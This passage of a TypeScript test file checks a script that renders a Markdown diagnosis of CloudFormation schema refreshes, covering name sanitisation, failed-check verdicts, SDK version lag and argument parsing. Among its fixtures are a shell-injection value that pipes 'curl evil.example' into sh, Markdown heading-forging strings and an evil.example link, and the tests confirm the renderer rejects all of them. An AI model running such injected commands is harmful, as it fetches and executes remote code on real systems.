  // the rejections, so a reverted site is a failing count rather than a case
  // nobody wrote.
  const POISON = 'Foo`\n\n## Nothing in this refresh needs a decision';
  // `resourceType` reaches Markdown in four more places, and main() takes it
  // verbatim from the fixture the bundle wrote.
  const POISON_TYPE = 'AWS::X::Y`\n\n## Nothing in this refresh needs a decision';

  it('rejects a hostile name in every position a bundle-derived name reaches', () => {
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: POISON_TYPE,
          properties: [POISON],
          candidates: { [POISON]: [] },
          renameCandidates: { [POISON]: [POISON] },
          providerPath: 'src/provisioning/providers/glue-provider.ts',
        },
      ],
      writableAdded: [{ resourceType: POISON_TYPE, properties: [POISON] }],
      divergences: [
        {
          resourceType: POISON_TYPE,
          nestedKey: POISON,
          bucket: 'no-sdk-member',
          // Non-empty: an empty detail short-circuits the ternary, so the
          // `renderDetail` CALL SITE could be reverted with the count intact.
          detail: 'SDK has `X`',
        },
      ],
      // The unreadable section renders a name too, and adding a render site the
      // poison input cannot reach defeats this case's stated job.
      unreadable: ['AWS-X-Y`\n\n## Nothing in this refresh needs a decision.json'],
      // The failed-check HEADING is a twelfth site; without an entry here it
      // was pinned only against the wrong-guard swap, not against no guard.
      failedChecks: [POISON_TYPE],
      // The two SETTLED sections render a type, a property and a rationale
      // each. They were added by go-to-k/cdkd#3005 and did not join this input,
      // so four render sites were outside the only case that watches them —
      // which is precisely what the comment above forbids.
      autoTolerated: [{ resourceType: POISON_TYPE, property: POISON, rationale: 'SDK has `X`' }],
      alreadyTolerated: [
        { resourceType: POISON_TYPE, property: POISON, rationale: 'SDK has `X`' },
      ],
      skipped: [POISON],
      sdkLag: [
        {
          resourceType: POISON_TYPE,
          client: '@aws-sdk/client-glue',
          installed: '3.0.0',
          latest: '3.1.0',
          behind: true,
          matched: true,
        },
        {
          // The RULED-OUT arm, which is the ordinary case — an installed client
          // that is current. It renders its own `resourceType`, and with only
          // the `behind: true` row here that interpolation could be reverted to
          // raw with nothing noticing. Two arms, two poisoned rows.
          resourceType: POISON_TYPE,
          client: '@aws-sdk/client-ec2',
          installed: '3.0.0',
          latest: '3.0.0',
          behind: false,
          matched: true,
        },
      ],
    });
    // Every position, both halves. The `resourceType` positions were fed a
    // CLEAN value at first, so three of them could be reverted to raw
    // interpolation individually with the count still 5 — and `resourceType` is
    // the one main() reads straight out of the fixture (`JSON.parse(committed)
    // .resourceType ?? file`), unconstrained.
    //
    // Sites, in render order: the removal's type heading and its property
    // bullet, the rename bullet, the divergence line's type and its key, the
    // writable-added type and its property list, the lag row's type, the
    // skipped list, and the two SETTLED sections' type + property (two each).
    const rejections = (md.match(/\[(?:name|key) rejected: unexpected characters\]/g) ?? []).length;
    expect(rejections, 'a call site is interpolating a bundle-derived name raw').toBe(16);
    // `renderDetail` strips rather than rejects, so it needs its own witness:
    // the backtick it removes cannot appear in the rendered detail.
    expect(md, 'renderDetail was bypassed at its call site').not.toContain('SDK has `X`');
    expect(md).toContain('SDK has X');
    // And the forged heading never renders as one.
    expect(md).not.toMatch(/^## Nothing in this refresh needs a decision$/m);
  });

  it('keeps a hostile name out of the rendered report', () => {
    // There is no paste-able `describe-type` block any more — it was demoted
    // (go-to-k/cdkd#2774: the CFn registry is not the authority for an SDK
    // Provider's declaration, and it re-reads the same upstream description
    // this job already read), and `renderLiteral`, which existed only to keep a
    // `'` out of that block's single quotes, went with it. The names still reach
    // Markdown, so the hostile-input case stays — through `renderName` now,
    // which is what the surviving path uses.
    const md = renderDiagnosis({
      removed: [
        {
          resourceType: "AWS::X::Y'; curl evil.example | sh; echo '",
          properties: ["Name'; curl evil.example | sh; echo '"],
          candidates: {},
        },
      ],
      writableAdded: [],
      divergences: [],
      skipped: [],
    });
    expect(md).not.toContain('curl evil.example');
    // And the rejection is VISIBLE, not a silent drop: a reader must be able to
    // tell a refused name from a type that simply had nothing to report.
    expect(md).toMatch(/rejected/i);
  });

  it('renderKey admits a real nested path and refuses a span-breaking one', () => {
    expect(renderKey('DistributionConfig.Origins.Items.CustomHeaders')).toBe(
      '`DistributionConfig.Origins.Items.CustomHeaders`'
    );
    expect(renderKey('#top')).toBe('`#top`');
    expect(renderKey('Foo`bar')).toContain('rejected');
    expect(renderKey('Foo [x](https://evil.example)')).toContain('rejected');
  });


  it('renderDetail strips what could end the line, and keeps the prose', () => {
    expect(renderDetail('SDK has `OAuth2Properties`, but the provider never writes it')).toBe(
      'SDK has OAuth2Properties, but the provider never writes it'
    );
    expect(renderDetail('x\n## Forged')).not.toContain('\n');
  });
});

describe('the failed-checks verdict', () => {
  it('names EVERY failed check, not just the one that was noticed first', () => {
    // A list rather than a flag per check: `property-coverage`'s red was
    // discarded for six rounds, and closing that left `sdk-attr-coverage` and
    // `enrichment-coverage` — both fixture-driven, both CI-blocking, both
    // reddened by a pure schema ADDITION — reporting nothing at all.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 2,
      divergences: [],
      failedChecks: ['audit:sdk-attr-coverage:check', 'audit:enrichment-coverage:check'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('audit:sdk-attr-coverage:check');
    expect(md).toContain('audit:enrichment-coverage:check');
    expect(md).toContain('enrichResourceAttributes');
  });

  it('names a check it has no guidance for rather than staying silent', () => {
    // HYPHENATED, deliberately. The first version of this case used
    // `audit:something:check` — the one name in the file with no hyphen — so it
    // passed the wrong guard and could not see that every real check name
    // rendered as the rejection placeholder. A check with no guidance row has
    // nothing else naming it, so it lost its name completely.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: ['audit:some-new-thing:check'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('audit:some-new-thing:check');
    expect(md).toContain('no guidance');
    expect(md, 'the heading went through the wrong guard').not.toContain('rejected');
  });

  it('renders every check the table knows, and every one the workflow runs', () => {
    // A CLASS fence, because this is the third round in which a render site
    // rejected the legitimate names it exists to show: fixture filenames, then
    // check names. Driving the REAL name sets means a fourth site cannot be
    // added with the wrong guard and stay green.
    const workflow = readFileSync(
      join(REPO_ROOT, '.github/workflows/cfn-schema-refresh.yml'),
      'utf8'
    );
    const fromWorkflow = [...workflow.matchAll(/^\s*run_check (\S+)/gm)].map((m) => m[1]!);
    const names = [...new Set([...Object.keys(CHECK_GUIDANCE), ...fromWorkflow])];
    expect(names.length, 'no check names found — this case fences nothing').toBeGreaterThanOrEqual(4);
    expect(
      names.some((n) => n.includes('-')),
      'no hyphenated name in the set — the case cannot see the defect it exists for'
    ).toBe(true);
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: names,
      skipped: [],
    });
    expect(md).not.toContain('rejected');
    for (const name of names) expect(md, `${name} is not named`).toContain(name);
  });

  it('never renders "additions only" over a coverage check that FAILED', () => {
    // Its status was discarded by the workflow for six rounds — `|| echo` stops
    // `set -e` aborting and nothing else — so a red check rendered as clean.
    // The trigger is a pure schema ADDITION: the test fails when AWS RE-ADDS a
    // property some provider wrote off in `bogusTolerated`, and 12 such
    // properties across 10 types are one AWS addition away from it.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::Glue::Crawler', properties: ['LineageConfiguration'] }],
      divergences: [],
      failedChecks: ['property-coverage'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('property-coverage');
    expect(md).toContain('bogusTolerated');
    // The property is still listed, but the section says the listing does not
    // cover it — it was previously labelled "no decision needed" and posted to
    // the backfill umbrella as newly unaccounted.
    expect(md).toContain('NOT covered by');
  });

  it('renders the clean verdict when the coverage check passed', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      failedChecks: [],
      skipped: [],
    });
    expect(md).toContain('additions only');
  });
});

describe('fixtures the report could not read', () => {
  it('never renders "additions only" while a fixture went unaccounted', () => {
    // A type that throws during the comparison vanishes from the removal AND
    // the addition accounting, so the residue reads as clean rather than as
    // silent. The other parsers grew shortfall counters in earlier rounds.
    //
    // The FILENAME shape is load-bearing and this case had it wrong: the
    // refresh writes `AWS::Glue::Connection` as `AWS-Glue-Connection.json`, and
    // `renderName`'s class excludes `-`, so the first version of this section
    // put all 134 possible names through the rejection placeholder — while this
    // case fed a name the directory can never hold and passed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: ['AWS-Glue-Connection.json'],
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('could not read');
    expect(md).toContain('AWS::Glue::Connection');
    expect(md, 'the filename went through the guard unconverted').not.toContain('rejected');
  });

  it('renders the real directory’s filenames, not a hand-written shape', () => {
    // Anchored on the actual directory rather than on a literal: a rename in
    // `refresh-cfn-schemas.mjs` would otherwise leave this passing while every
    // rendered name became a placeholder.
    const files = readdirSync(join(REPO_ROOT, 'tests/fixtures/cfn-schemas'))
      .filter((f) => f.endsWith('.json') && !f.startsWith('_'))
      .slice(0, 5);
    expect(files.length, 'no fixtures found — this case checks nothing').toBe(5);
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: files,
      skipped: [],
    });
    expect(md).not.toContain('rejected');
    for (const file of files) {
      expect(md).toContain(file.replace(/\.json$/, '').replace(/-/g, '::'));
    }
  });

  it('says nothing about unreadable fixtures when there are none', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      unreadable: [],
      skipped: [],
    });
    expect(md).toContain('additions only');
    expect(md).not.toContain('could not read');
  });
});

describe('the read-only additions section', () => {
  it('does not promise a read-only addition is always a no-op', () => {
    // A new read-only `*Arn`/`*Url` on a type that had none fails
    // `audit:sdk-attr-coverage:check`, and that is reachable ONLY through a
    // read-only addition — so "nothing to do" was a verdict a blocking critic
    // contradicts. 92 of the 134 audited types have no Arn attribute today.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      readOnlyAddedCount: 3,
      divergences: [],
      skipped: [],
    });
    expect(md).toContain('usually nothing to do');
    expect(md).toContain('sdk-attr-coverage');
  });
});

describe('the unparsed-failure verdict', () => {
  it('never renders "additions only" over a checker that said it failed', () => {
    // Both wrong answers shipped: throwing discarded the whole diagnosis,
    // returning [] rendered the refresh as clean. The third answer is a section
    // naming what happened, and the clean verdict suppressed.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [{ resourceType: 'AWS::S3::Bucket', properties: ['NewThing'] }],
      divergences: [],
      nestedKeyUnparsed: true,
      skipped: [],
    });
    expect(md).not.toContain('additions only');
    expect(md).toContain('could not read');
    expect(md).toContain('audit:nested-key-coverage:check');
    // The rest of the report is still rendered — that is the whole point of not
    // throwing.
    expect(md).toContain('NewThing');
  });

  it('renders the clean verdict when the checker did NOT fail', () => {
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [],
      nestedKeyUnparsed: false,
      skipped: [],
    });
    expect(md).toContain('additions only');
  });
});

describe('sdkClientVersions', () => {
  it('pairs each client with ITS OWN installed version', () => {
    // The lag question has no member to look up, and asking `sdkModelsMember`
    // with a name that matches nothing answered with the provider's FIRST
    // import — right only by coincidence.
    // `asg-provider.ts`, not a single-client provider: it imports
    // `@aws-sdk/client-auto-scaling` and `@aws-sdk/client-ec2` at DIFFERENT
    // installed versions. With one row in hand a mispairing is unobservable —
    // pinning `version` to `rows[0]`'s left this green against
    // `route53-provider.ts`.
    const rows = sdkClientVersions('src/provisioning/providers/asg-provider.ts', REPO_ROOT);
    expect(rows.length, 'asg-provider no longer imports two clients').toBeGreaterThan(1);
    for (const { client, version } of rows) {
      expect(client).toMatch(/^@aws-sdk\/client-/);
      const onDisk = JSON.parse(
        readFileSync(join(REPO_ROOT, 'node_modules', client, 'package.json'), 'utf8')
      ).version;
      expect(version, `${client} paired with another client's version`).toBe(onDisk);
    }
  });

  it('pairs correctly when the two clients are at DIFFERENT versions', () => {
    // The discriminating half, and it is synthetic BECAUSE the real tree can
    // no longer supply it: every `@aws-sdk/client-*` moves as one dependabot
    // group, so after a bump they all share a version and the real-provider
    // case above cannot tell a correct pairing from `rows[0]`'s version
    // repeated. Its own anti-vacuity guard said so and failed, which is how
    // this case came to exist — the guard is not deleted, it is answered.
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-sdkver-'));
    try {
      const provider = join(dir, 'src/provisioning/providers');
      mkdirSync(provider, { recursive: true });
      writeFileSync(
        join(provider, 'two-client-provider.ts'),
        [
          "import { AlphaClient } from '@aws-sdk/client-alpha';",
          "import { BetaClient } from '@aws-sdk/client-beta';",
          'export const x = [AlphaClient, BetaClient];',
        ].join('\n')
      );
      for (const [name, version] of [
        ['alpha', '3.1.0'],
        ['beta', '3.999.0'],
      ] as const) {
        const pkg = join(dir, 'node_modules/@aws-sdk', `client-${name}`);
        // `dist-types/models` must EXIST: an installed-but-typeless package is
        // skipped rather than reported, which is the honest answer for a lag
        // question there is no model to ask.
        mkdirSync(join(pkg, 'dist-types/models'), { recursive: true });
        writeFileSync(
          join(pkg, 'package.json'),
          JSON.stringify({ name: `@aws-sdk/client-${name}`, version })
        );
      }
      const rows = sdkClientVersions('src/provisioning/providers/two-client-provider.ts', dir);
      expect(
        new Set(rows.map((r) => r.version)).size,
        'the fixture no longer supplies two DIFFERENT versions'
      ).toBe(2);
      expect(rows).toEqual([
        { client: '@aws-sdk/client-alpha', version: '3.1.0' },
        { client: '@aws-sdk/client-beta', version: '3.999.0' },
      ]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('returns nothing rather than guessing when the provider is unknown', () => {
    expect(sdkClientVersions(undefined, REPO_ROOT)).toEqual([]);
  });
});

describe('the SDK-lag section', () => {
  const divergence = {
    resourceType: 'AWS::Glue::Connection',
    nestedKey: 'OAuth2Properties.X',
    bucket: 'no-sdk-member',
    detail: '',
  };

  it('scopes every lag row to the type it was computed for', () => {
    // A single line covering "the first divergent type" read as a verdict over
    // divergences it never looked at.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [divergence, { ...divergence, resourceType: 'AWS::ECS::Service' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Glue::Connection',
          client: '@aws-sdk/client-glue',
          installed: '3.9.0',
          latest: '3.9.0',
          behind: false,
          matched: true,
        },
      ],
    });
    expect(md).toContain('AWS::Glue::Connection');
    expect(md).toContain('ruled out here');
    // The type with NO row must not read as covered by the one that has it.
    expect(md).toContain('UNKNOWN, not ruled out');
  });

  it('keeps the UNKNOWN caveat when EVERY lookup failed', () => {
    // npm unreachable from CI is the ordinary way that happens, and gating the
    // whole block on having rows made the report go silent about SDK lag
    // exactly when it knew least — which reads as ruled out.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [divergence],
      skipped: [],
      sdkLag: [],
    });
    expect(md).toContain('Nothing could be read');
    expect(md).toContain('UNKNOWN, not ruled out');
  });

  it('does not attribute a lag verdict to a client that is not the type’s own', () => {
    // `clientsForType` falls back to every imported client when none matches,
    // so a row can name `@aws-sdk/client-sts` for a Logs divergence. Saying
    // "ruled out here" over it claims something about the wrong service.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [{ ...divergence, resourceType: 'AWS::Logs::LogGroup' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Logs::LogGroup',
          client: '@aws-sdk/client-sts',
          installed: '3.0.0',
          latest: '3.0.0',
          behind: false,
          matched: false,
        },
      ],
    });
    expect(md).toContain('may not be the type\u2019s own');
    expect(md).not.toContain('ruled out here');
  });

  it('says "here" for a MATCHED client, however it is named', () => {
    // The true positive the previous case could not see. Re-deriving the name
    // test in the renderer made this row read "not the type's own" about
    // `AWS::Events::Rule`'s only client — a live, applicable lag the reader was
    // told to discount.
    const md = renderDiagnosis({
      removed: [],
      writableAdded: [],
      divergences: [{ ...divergence, resourceType: 'AWS::Events::Rule' }],
      skipped: [],
      sdkLag: [
        {
          resourceType: 'AWS::Events::Rule',
          client: '@aws-sdk/client-eventbridge',
          installed: '3.0.0',
          latest: '3.1.0',
          behind: true,
          matched: true,
        },
      ],
    });
    expect(md).toContain('LIVE here');
    expect(md).not.toContain('may not be');
  });

  it('rejects a version string that is not one', () => {
    // The anchor is the whole guard: without `$`, `npm view` output carrying a
    // trailing line would be reported as the published version.
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1')).toEqual({
      installed: '3.9.0',
      latest: '3.9.1',
      behind: true,
    });
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => '3.9.1\nnpm WARN x')).toBeUndefined();
    expect(sdkVersionLag('@aws-sdk/client-glue', '3.9.0', () => 'not-a-version')).toBeUndefined();
  });
});

describe('clientsForType', () => {
  const rows = [
    { client: '@aws-sdk/client-sts', version: '3.0.0' },
    { client: '@aws-sdk/client-glue', version: '3.1.0' },
  ];

  it('drops the clients a provider imports that do not serve the type', () => {
    // Live-observed: a Glue key divergence reported `@aws-sdk/client-sts` as
    // lagging, which is true and says nothing about the finding. Most providers
    // import STS.
    expect(clientsForType('AWS::Glue::Connection', rows)).toEqual([
      { client: '@aws-sdk/client-glue', version: '3.1.0', matched: true },
    ]);
  });

  it('matches a service whose client name carries SEPARATORS the type does not', () => {
    // `@aws-sdk/client-apigatewayv2` was the first pick here and it has no
    // separator, so deleting the separator strip left this green — the
    // fallback-to-every-row arm returned the same single-element array the
    // match arm would have. Two REAL pairs, and a second row that only the
    // match arm can exclude.
    const separated = [
      { client: '@aws-sdk/client-ec2', version: '3.1018.0' },
      { client: '@aws-sdk/client-auto-scaling', version: '3.1045.0' },
    ];
    expect(clientsForType('AWS::AutoScaling::AutoScalingGroup', separated)).toEqual([
      { client: '@aws-sdk/client-auto-scaling', version: '3.1045.0', matched: true },
    ]);
    const route53 = [
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
      { client: '@aws-sdk/client-route-53', version: '3.1.0' },
    ];
    expect(clientsForType('AWS::Route53::HostedZone', route53)).toEqual([
      { client: '@aws-sdk/client-route-53', version: '3.1.0', matched: true },
    ]);
  });

  it('falls back to EVERY row rather than to none when nothing matches', () => {
    // An empty answer renders as an absent type, which the section calls
    // "UNKNOWN, not ruled out" — but silently narrowing to nothing would hide a
    // real lag behind a naming mismatch. Widening is the safe direction.
    const hedged = rows.map((r) => ({ ...r, matched: false }));
    expect(clientsForType('AWS::Made::Up', rows)).toEqual(hedged);
    expect(clientsForType('', rows)).toEqual(hedged);
  });

  it('matches the service name EXACTLY, not by prefix', () => {
    // `startsWith` is equivalent on today's tree — every widening it causes is
    // a single-client provider the next arm settles anyway — so nothing caught
    // it. It bites where a client suffix is a proper superstring of the service
    // segment, and then the renderer says "here" about the wrong client.
    const rows = [
      { client: '@aws-sdk/client-s3-control', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    expect(clientsForType('AWS::S3::Bucket', rows).every((r) => !r.matched)).toBe(true);
  });

  it('does not settle a single client against a type name that did not parse', () => {
    // The arm reasons "one client, nothing to disambiguate" — which is only
    // true once there IS a service to disambiguate against.
    const one = [{ client: '@aws-sdk/client-eventbridge', version: '3.1.0' }];
    expect(clientsForType('', one)).toEqual([
      { client: '@aws-sdk/client-eventbridge', version: '3.1.0', matched: false },
    ]);
  });

  it('settles a SINGLE-client provider even when the name test cannot', () => {
    // The name test is a heuristic, and reading its failure as "wrong client"
    // was a regression: 13 of the 134 registered types are served by a client
    // not named after their service segment, and telling the reader to discount
    // a live, applicable lag is the confident-wrong-answer direction. With one
    // client there is nothing to disambiguate.
    const one = [{ client: '@aws-sdk/client-eventbridge', version: '3.1.0' }];
    expect(clientsForType('AWS::Events::Rule', one)).toEqual([
      { client: '@aws-sdk/client-eventbridge', version: '3.1.0', matched: true },
    ]);
  });

  it('hedges only where the provider really is ambiguous', () => {
    // Measured over the real tree: name test 119, single-client arm 10,
    // genuinely ambiguous 3 — a provider importing several clients, none named
    // for the service. `AWS::Logs::LogGroup` is one of the three.
    const ambiguous = [
      { client: '@aws-sdk/client-cloudwatch-logs', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    expect(clientsForType('AWS::Logs::LogGroup', ambiguous).every((r) => !r.matched)).toBe(true);
  });

  it('agrees with the real tree: at most a handful of types stay ambiguous', () => {
    // A floor AND a ceiling. Zero hedged rows would mean the flag stopped
    // discriminating; a large number would mean the name test broke.
    const map = mapTypesToProviderFiles(
      readFileSync(join(REPO_ROOT, 'src/provisioning/register-providers.ts'), 'utf8')
    );
    let hedged = 0;
    let settled = 0;
    for (const [type, file] of map) {
      const rows = sdkClientVersions(file, REPO_ROOT);
      if (rows.length === 0) continue;
      if (clientsForType(type, rows)[0]!.matched) settled++;
      else hedged++;
    }
    // BOTH bounds are on `hedged`, and that is the correction: every type with
    // a client increments exactly one counter, so `settled + hedged` is a
    // constant and `settled > 100` could never be the failing assertion —
    // `hedged <= 6` already implies it. The floor the old comment promised was
    // asserted by neither line, and `matched: true` unconditionally gave
    // {settled: 132, hedged: 0} while passing both.
    expect(settled + hedged, 'no type reached a client at all').toBeGreaterThan(100);
    expect(hedged, 'more types went ambiguous than the measurement found').toBeLessThanOrEqual(6);
    expect(hedged, 'nothing hedges any more — the flag stopped discriminating').toBeGreaterThan(0);
  });
});

describe('buildSdkLag', () => {
  it('emits no row for a type that resolves to no client at all', () => {
    // This is one of the upstream causes of the "no version row" route the
    // unresolved listing now tells the reader about, and nothing pinned that it
    // can arise: every other no-row case here comes from `versionLag` returning
    // undefined, which is a DIFFERENT cause with the same rendering. Two types
    // reach no client, so the route is real rather than hypothetical.
    const rows = buildSdkLag(
      [{ resourceType: 'AWS::Glue::Connection', bucket: 'definition-member-missing' }],
      () => [],
      () => {
        throw new Error('no client means no version lookup may be attempted');
      }
    );
    expect(rows).toEqual([]);
  });

  const glue = { resourceType: 'AWS::Glue::Connection', bucket: 'no-sdk-member' };
  const clientsFor = () => [
    { client: '@aws-sdk/client-sts', version: '3.0.0' },
    { client: '@aws-sdk/client-glue', version: '3.1.0' },
  ];
  const lag = (client: string, installed: string) => ({
    installed,
    latest: '9.9.9',
    behind: true,
  });

  it('narrows to the type’s own client, so an unrelated import is not reported', () => {
    expect(buildSdkLag([glue], clientsFor, lag)).toEqual([
      {
        resourceType: 'AWS::Glue::Connection',
        client: '@aws-sdk/client-glue',
        // Carried through, never re-derived downstream: two sites computing the
        // same predicate is how the renderer came to disagree with the narrower.
        matched: true,
        installed: '3.1.0',
        latest: '9.9.9',
        behind: true,
      },
    ]);
  });

  it('carries a HEDGED flag through, so the renderer never has to re-derive it', () => {
    const ambiguous = () => [
      { client: '@aws-sdk/client-cloudwatch-logs', version: '3.1.0' },
      { client: '@aws-sdk/client-sts', version: '3.0.0' },
    ];
    const rows = buildSdkLag(
      [{ resourceType: 'AWS::Logs::LogGroup', bucket: 'no-sdk-member' }],
      ambiguous,
      lag
    );
    expect(rows.length).toBe(2);
    expect(rows.every((r) => r.matched === false)).toBe(true);
  });

  it('emits ONE row per (type, client) however many divergences land on it', () => {
    // Several divergences on one type is the ordinary case, and a repeated row
    // reads as several findings.
    expect(buildSdkLag([glue, glue, glue], clientsFor, lag)).toHaveLength(1);
  });

  it('asks each client at most once', () => {
    const asked: string[] = [];
    buildSdkLag(
      [glue, { resourceType: 'AWS::Glue::Crawler', bucket: 'no-sdk-member' }],
      clientsFor,
      (client, installed) => {
        asked.push(client);
        return { installed, latest: '9.9.9', behind: true };
      }
    );
    // `npm view` is a network call; two types sharing a client must not pay twice.
    expect(asked).toEqual(['@aws-sdk/client-glue']);
  });

  it('never asks anything for a case-divergence', () => {
    const asked: string[] = [];
    const rows = buildSdkLag(
      [{ resourceType: 'AWS::ECS::Service', bucket: 'case-divergence' }],
      clientsFor,
      (client, installed) => {
        asked.push(client);
        return { installed, latest: '9.9.9', behind: true };
      }
    );
    // There is no judgement in a case divergence, so it justifies no lookup.
    expect(asked).toEqual([]);
    expect(rows).toEqual([]);
  });

  it('drops a client whose lag could not be read, rather than inventing a row', () => {
    expect(buildSdkLag([glue], clientsFor, () => undefined)).toEqual([]);
  });
});

describe('the script end to end', () => {
  // `main()` had no coverage at all, and the two defects review found in the
  // lag path were both reachable only through it. These spawn the real binary
  // against the real repo. Neither log carries a non-case divergence, so no
  // `npm view` runs and the cases stay offline.
  const SCRIPT = join(REPO_ROOT, 'scripts/diagnose-schema-refresh.mjs');
  const run = (log: string, rc?: string, extra: string[] = []): string => {
    const dir = mkdtempSync(join(tmpdir(), 'cdkd-diagnose-'));
    try {
      const path = join(dir, 'nested-key.log');
      writeFileSync(path, log);
      const args = [SCRIPT, '--nested-key-log', path];
      if (rc !== undefined) args.push('--nested-key-rc', rc);
      args.push(...extra);
      return execFileSync('node', args, { encoding: 'utf8' });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  it('reports a clean refresh as clean', () => {
    const md = run('nested-key-coverage: OK — 0 divergences\n');
    expect(md).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('carries an unreadable checker failure all the way to the body', () => {
    // The wiring from `parseNestedKeyDivergences`'s flag to the rendered
    // section is one line in main(), and it was the sole production path of the
    // whole feature.
    const md = run(
      'nested-key-coverage: FAIL — stale NESTED_KEY_ALLOW_LIST entr(ies) match no audited key\n'
    );
    expect(md).toContain('could not read');
    expect(md).not.toContain('Nothing in this refresh needs a decision — additions only');
  }, 60_000);

  it('treats an UNREADABLE exit code as a failure, not as success', () => {
    // Both arms of the flag reader used to return 0 — "the checker succeeded" —
    // so a mistyped value silently restored the behaviour where a checker that
    // never ran renders as "additions only".
    for (const unreadable of ['not-a-number', '', ' ']) {
      expect(run('', unreadable), `read as success: ${JSON.stringify(unreadable)}`).toContain(
        'could not read'
      );
    }
    // The ABSENT flag stays 0 on purpose: this script is also run by hand, and
    // refusing every manual invocation is not a safety property. The workflow
    // dropping the flag is guarded in the workflow test instead.
    expect(run('')).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('carries --failed-checks from the command line into the body', () => {
    // The workflow test pins the shell that PASSES the list and the renderer
    // tests hand-feed it; nothing joined them, so `main()` could discard the
    // list and render "additions only" over a red check — the exact defect
    // eight rounds went into finding. The sibling `--nested-key-rc` had this
    // case; the twin was never written.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      'property-coverage,audit:sdk-attr-coverage:check',
    ]);
    expect(md).not.toContain('Nothing in this refresh needs a decision');
    expect(md).toContain('property-coverage');
    expect(md).toContain('audit:sdk-attr-coverage:check');
  }, 60_000);

  it('treats an EMPTY --failed-checks as nothing failed', () => {
    // The list is empty on every green cycle, so this is the ordinary path and
    // it must not render a decision section.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '',
    ]);
    expect(md).toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('refuses a --failed-checks given with NO value', () => {
    // Present-with-no-value is unreadable, not empty, and empty reads as
    // "nothing failed" — the same distinction `--nested-key-rc` needed. The
    // script still exits 0 (a diagnosis must not take down the PR it
    // describes), so the refusal has to be visible in the body.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, ['--failed-checks']);
    expect(md).not.toContain('Nothing in this refresh needs a decision');
    // The MESSAGE, not just the outcome: without the explicit refusal the
    // `undefined` reaches `.split(',')` and throws a TypeError, which the outer
    // handler renders as the same generic failure — so asserting "failed to
    // run" alone could not tell the deliberate refusal from the accident, and
    // the maintainer would read `Cannot read properties of undefined`.
    expect(md).toContain('--failed-checks was given with no value');
  }, 60_000);

  it('refuses a log path that does not exist', () => {
    // The third arg reader was the last one still silent on both counts. A
    // missing `--skipped-log` returned `''`, the section is omitted when empty,
    // and an unread log is then byte-identical to "everything was refreshed" —
    // with no companion status flag to rescue it, unlike `--nested-key-log`.
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log',
      '/no/such/path.log',
    ]);
    expect(md).toContain('which does not exist');
    expect(md).not.toContain('Nothing in this refresh needs a decision');
  }, 60_000);

  it('refuses a flag consumed as another flag’s value', () => {
    // `undefined` is only the TRAILING spelling of "no value". A following FLAG
    // is the same mistake and was read as the value: this fabricated a failed
    // check literally named `--skipped-log`, rendered with "no guidance".
    const md = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks',
      '--skipped-log',
      '/dev/null',
    ]);
    expect(md).toContain('--failed-checks was given with no value');
    expect(md).not.toContain('no guidance');
  }, 60_000);

  it('reads the --flag=value spelling too, in every reader', () => {
    // `args.indexOf(flag)` returns -1 for the glued form, so a mistyped
    // invocation fell through to each reader's ABSENT arm: `''` for the log
    // readers and 0 — "the checker succeeded" — for the status one. Only the
    // workflow's space form held it shut, and the fence for that accepted
    // `--skipped-log=...` as well.
    // All THREE readers, each through its own flag — the title said "every
    // reader" while only `readArgValue` was exercised, so a per-reader
    // regression would have passed.
    const list = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--failed-checks=property-coverage',
    ]);
    expect(list).toContain('property-coverage');
    expect(list).not.toContain('Nothing in this refresh needs a decision');

    // `readNumArg`: a non-zero status with nothing parsed is a failure.
    const status = run('', undefined, ['--nested-key-rc=2']);
    expect(status).toContain('could not read');

    // `readArg`: a path that does not exist is refused, not read as empty.
    const path = run('nested-key-coverage: OK — 0 divergences\n', undefined, [
      '--skipped-log=/no/such/path.log',
    ]);
    expect(path).toContain('which does not exist');
  }, 60_000);

  it('refuses a SINGLE-dash token where a value was expected', () => {
    // The guard covered `--x` only, while the workflow comment eight lines from
    // it warns about exactly the single-dash spelling (`-props`). This
    // fabricated a failed check rendered as `#### \`-property-coverage\``.
